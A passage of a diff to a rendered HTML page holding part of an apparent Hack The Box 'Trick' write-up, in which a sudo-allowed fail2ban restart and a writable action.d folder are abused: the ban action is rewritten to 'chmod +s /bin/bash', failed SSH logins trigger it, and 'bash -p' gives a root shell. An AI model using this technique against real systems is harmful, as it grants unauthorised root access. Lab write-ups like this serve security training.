+<span class="normal"><a href="#__codelineno-41-4">4</a></span>
+<span class="normal"><a href="#__codelineno-41-5">5</a></span>
+<span class="normal"><a href="#__codelineno-41-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1"></a>Matching Defaults entries for michael on trick:
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2"></a>    env_reset, mail_badpass,
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3"></a>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4"></a>
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5"></a>User michael may run the following commands on trick:
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6"></a>    (root) NOPASSWD: /etc/init.d/fail2ban restart
+</span></code></pre></div></td></tr></table></div>
 <p>Interesting part here is that michael may run fail2ban command as root without any password. This is due to a misconfiguration and we can exploit it.</p>
 <p>For starters, michael has writing permissions over the configuration files located in /etc/fail2ban/action.d</p>
 <p>Run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>ls<span class="w"> </span>-la<span class="w"> </span>/etc/fail2ban
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-42-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1"></a>ls<span class="w"> </span>-la<span class="w"> </span>/etc/fail2ban
+</span></code></pre></div></td></tr></table></div>
 <p>And we can see michael, as part of the security group has rwx rights on the directory owned by root:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>...
-</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>drwxrwx---   2 root security  4096 Oct 20 11:03 action.d
-</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>...
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-43-1">1</a></span>
+<span class="normal"><a href="#__codelineno-43-2">2</a></span>
+<span class="normal"><a href="#__codelineno-43-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1"></a>...
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2"></a>drwxrwx---   2 root security  4096 Oct 20 11:03 action.d
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3"></a>...
+</span></code></pre></div></td></tr></table></div>
 <p>Now we need to understand what fail2ban is and how it works. fail2ban is a great IDPS tool, not only it can detect attacks but also block malicious IP addresses by using Linux iptables. Although fail2ban can be used for services like HTTP, SMTP, IMAP, etc. most sys-admins use it to protect the SSH service. fail2ban daemon reads the log files and if there is a malicious pattern detected (e.g multiple failed login requests) it executes a command for blocking the IP for a certain period of time or maybe forever.</p>
 <p>In the file /etc/fail2ban/jail.conf, we can spot some customizations such as ban time and maxretry:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>cat<span class="w"> </span>/etc/fail2ban/jail.conf
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-44-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1"></a>cat<span class="w"> </span>/etc/fail2ban/jail.conf
+</span></code></pre></div></td></tr></table></div>
 <p>And we see that bantime is limited to 10 seconds and maximum of retries to 5:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a># &quot;bantime&quot; is the number of seconds that a host is banned.
-</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>bantime  = 10s
-</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>
-</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a># A host is banned if it has generated &quot;maxretry&quot; during the last &quot;findtime&quot;
-</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a># seconds.
-</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>findtime  = 10s
-</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>
-</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a># &quot;maxretry&quot; is the number of failures before a host gets banned.
-</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a>maxretry = 5
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-45-1">1</a></span>
+<span class="normal"><a href="#__codelineno-45-2">2</a></span>
+<span class="normal"><a href="#__codelineno-45-3">3</a></span>
+<span class="normal"><a href="#__codelineno-45-4">4</a></span>
+<span class="normal"><a href="#__codelineno-45-5">5</a></span>
+<span class="normal"><a href="#__codelineno-45-6">6</a></span>
+<span class="normal"><a href="#__codelineno-45-7">7</a></span>
+<span class="normal"><a href="#__codelineno-45-8">8</a></span>
+<span class="normal"><a href="#__codelineno-45-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1"></a># &quot;bantime&quot; is the number of seconds that a host is banned.
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2"></a>bantime  = 10s
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3"></a>
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4"></a># A host is banned if it has generated &quot;maxretry&quot; during the last &quot;findtime&quot;
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5"></a># seconds.
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6"></a>findtime  = 10s
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7"></a>
+</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8"></a># &quot;maxretry&quot; is the number of failures before a host gets banned.
+</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9"></a>maxretry = 5
+</span></code></pre></div></td></tr></table></div>
 <p>This means that if we retry ssh connection six times (so we exceed the maxretry parameter), the file  /etc/fail2ban/action.d/iptables-multiport.conf will be executed as root, and as a consequence, our host will be banned. Now, as part of the security group michael does have rwx permissions on the parent folder /etc/fail2ban/action.d, but not on the file /etc/fail2ban/action.d/iptables-multiport.conf:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>ls<span class="w"> </span>-la<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-46-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1"></a>ls<span class="w"> </span>-la<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf
+</span></code></pre></div></td></tr></table></div>
 <p>Result:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>-rw-r--r-- 1 root root 1420 Oct 20 12:48 iptables-multiport.conf
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-47-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1"></a>-rw-r--r-- 1 root root 1420 Oct 20 12:48 iptables-multiport.conf
+</span></code></pre></div></td></tr></table></div>
 <p>We need then, to be able to edit that file to include our malicious code. As the service fail2ban is restarted every minute or so, you need to execute the following commands quickly. They will allow you to overwrite the file /etc/fail2ban/action.d/iptables-multiport.conf:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="c1"># create a copy of the file to have rwx permissions</span>
-</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>mv<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf.bak
-</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="c1"># overwrite the existing file with your copy</span>
-</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>cp<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf.bak<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf
-</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="c1"># edit the file and add your lines</span>
-</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>nano<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf
-</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="c1"># In the file, comment the line with the  actionban definition and</span>
-</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a><span class="c1"># add:</span>
-</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a><span class="c1"># actionban = chmod +s /bin/bash</span>
-</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="c1"># Also in the file, comment the line with the  actionunban definition and</span>
-</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a><span class="c1"># add:</span>
-</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a><span class="c1"># actionunban = chmod +s /bin/bash</span>
-</span><span id="__span-48-13"><a id="__codelineno-48-13" name="__codelineno-48-13" href="#__codelineno-48-13"></a><span class="c1"># CTRL-X -   Yes and ENTER to save changes.</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-48-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-48-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-48-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-48-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-48-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-48-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-48-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-48-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-48-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-48-10">10</a></span>
+<span class="normal"><a href="#__codelineno-48-11">11</a></span>
+<span class="normal"><a href="#__codelineno-48-12">12</a></span>
+<span class="normal"><a href="#__codelineno-48-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1"></a><span class="c1"># create a copy of the file to have rwx permissions</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2"></a>mv<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf.bak
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3"></a><span class="c1"># overwrite the existing file with your copy</span>
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4"></a>cp<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf.bak<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5"></a><span class="c1"># edit the file and add your lines</span>
+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6"></a>nano<span class="w"> </span>/etc/fail2ban/action.d/iptables-multiport.conf
+</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7"></a><span class="c1"># In the file, comment the line with the  actionban definition and</span>
+</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8"></a><span class="c1"># add:</span>
+</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9"></a><span class="c1"># actionban = chmod +s /bin/bash</span>
+</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10"></a><span class="c1"># Also in the file, comment the line with the  actionunban definition and</span>
+</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11"></a><span class="c1"># add:</span>
+</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12"></a><span class="c1"># actionunban = chmod +s /bin/bash</span>
+</span><span id="__span-48-13"><a id="__codelineno-48-13" name="__codelineno-48-13"></a><span class="c1"># CTRL-X -   Yes and ENTER to save changes.</span>
+</span></code></pre></div></td></tr></table></div>
 <p>With "chmod +s /bin/bash" we're going to give the suid bit to bash. The suid bit provides the user running it the same privileges that the user who created it. In this case, root is the user who created it. If we run it, we'll have root privileges during its execution.
 The next step is restarting the service to get the file iptables-multiport.conf updated.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>sudo<span class="w"> </span>/etc/init.d/fail2ban<span class="w"> </span>restart
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-49-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1"></a>sudo<span class="w"> </span>/etc/init.d/fail2ban<span class="w"> </span>restart
+</span></code></pre></div></td></tr></table></div>
 <p>Now, when we fail to login into the system with ssh more than 5 times, the configuration set in iptables-multiport.conf will take place. For that, from the attacker command line:</p>
 <ol>
 <li>We install sshpass, a program that allows us to pass passwords in the command line to ssh. This way we can automate the login process:</li>
 </ol>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>sshpass
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-50-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>sshpass
+</span></code></pre></div></td></tr></table></div>
 <ol>
 <li>Write a script in the attacker machine:</li>
 </ol>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>nano<span class="w"> </span>wronglogin.sh
-</span></code></pre></div>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="ch">#!/bin/bash</span>
-</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>
-</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;wrongpassword&quot;</span><span class="w"> </span>ssh<span class="w"> </span>michael@10.10.11.166
-</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;wrongpassword&quot;</span><span class="w"> </span>ssh<span class="w"> </span>michael@10.10.11.166
-</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;wrongpassword&quot;</span><span class="w"> </span>ssh<span class="w"> </span>michael@10.10.11.166
-</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;wrongpassword&quot;</span><span class="w"> </span>ssh<span class="w"> </span>michael@10.10.11.166
-</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;wrongpassword&quot;</span><span class="w"> </span>ssh<span class="w"> </span>michael@10.10.11.166
-</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a>sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;wrongpassword&quot;</span><span class="w"> </span>ssh<span class="w"> </span>michael@10.10.11.166
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-51-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1"></a>nano<span class="w"> </span>wronglogin.sh
+</span></code></pre></div></td></tr></table></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-52-1">1</a></span>
+<span class="normal"><a href="#__codelineno-52-2">2</a></span>
+<span class="normal"><a href="#__codelineno-52-3">3</a></span>
+<span class="normal"><a href="#__codelineno-52-4">4</a></span>
+<span class="normal"><a href="#__codelineno-52-5">5</a></span>
+<span class="normal"><a href="#__codelineno-52-6">6</a></span>
+<span class="normal"><a href="#__codelineno-52-7">7</a></span>
+<span class="normal"><a href="#__codelineno-52-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1"></a><span class="ch">#!/bin/bash</span>
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2"></a>
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3"></a>sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;wrongpassword&quot;</span><span class="w"> </span>ssh<span class="w"> </span>michael@10.10.11.166
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4"></a>sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;wrongpassword&quot;</span><span class="w"> </span>ssh<span class="w"> </span>michael@10.10.11.166
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5"></a>sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;wrongpassword&quot;</span><span class="w"> </span>ssh<span class="w"> </span>michael@10.10.11.166
+</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6"></a>sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;wrongpassword&quot;</span><span class="w"> </span>ssh<span class="w"> </span>michael@10.10.11.166
+</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7"></a>sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;wrongpassword&quot;</span><span class="w"> </span>ssh<span class="w"> </span>michael@10.10.11.166
+</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8"></a>sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;wrongpassword&quot;</span><span class="w"> </span>ssh<span class="w"> </span>michael@10.10.11.166
+</span></code></pre></div></td></tr></table></div>
 <p>Add execution permission:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>chmod<span class="w"> </span>+x<span class="w"> </span>wronglongin.sh
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-53-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1"></a>chmod<span class="w"> </span>+x<span class="w"> </span>wronglongin.sh
+</span></code></pre></div></td></tr></table></div>
 <ol>
 <li>Launch the script:</li>
 </ol>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>./wronglogin.sh
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-54-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1"></a>./wronglogin.sh
+</span></code></pre></div></td></tr></table></div>
 <p>Once the script is executed, the suid bit will be activated for bash. Run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>/bin/bash
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-55-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1"></a><span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>/bin/bash
+</span></code></pre></div></td></tr></table></div>
 <p>And you will see:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>-rwsr-sr-x 1 root root 1168776 Oct 20  2022 /bin/bash
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-56-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1"></a>-rwsr-sr-x 1 root root 1168776 Oct 20  2022 /bin/bash
+</span></code></pre></div></td></tr></table></div>
 <p>Now if we run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>bash<span class="w"> </span>-p
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-57-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1"></a>bash<span class="w"> </span>-p
+</span></code></pre></div></td></tr></table></div>
 <p>The -p flag turns on privileged mode.  In this mode, the <code>$BASH_ENV' and '$ENV' files are not processed, shell functions are not inherited from the environment, and the</code>SHELLOPTS', 'BASHOPTS', 'CDPATH' and 'GLOBIGNORE' variables, if they appear in the environment, are ignored. The result:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>michael@trick:~$ bash -p
-</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>bash-5.0# id
-</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>uid=1001(michael) gid=1001(michael) euid=0(root) egid=0(root) groups=0(root),1001(michael),1002(security)
-</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a>bash-5.0# cd /root
-</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>bash-5.0# ls
-</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>f2b.sh  fail2ban  root.txt  set_dns.sh
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-58-1">1</a></span>
+<span class="normal"><a href="#__codelineno-58-2">2</a></span>
+<span class="normal"><a href="#__codelineno-58-3">3</a></span>
+<span class="normal"><a href="#__codelineno-58-4">4</a></span>
+<span class="normal"><a href="#__codelineno-58-5">5</a></span>
+<span class="normal"><a href="#__codelineno-58-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1"></a>michael@trick:~$ bash -p
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2"></a>bash-5.0# id
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3"></a>uid=1001(michael) gid=1001(michael) euid=0(root) egid=0(root) groups=0(root),1001(michael),1002(security)
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4"></a>bash-5.0# cd /root
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5"></a>bash-5.0# ls
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6"></a>f2b.sh  fail2ban  root.txt  set_dns.sh
+</span></code></pre></div></td></tr></table></div>
 <p>To display the system flag:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>cat<span class="w"> </span>root.txt
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-59-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1"></a>cat<span class="w"> </span>root.txt
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17840,7 +18144,7 @@ The next step is restarting the service to get the file iptables-multiport.conf 
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
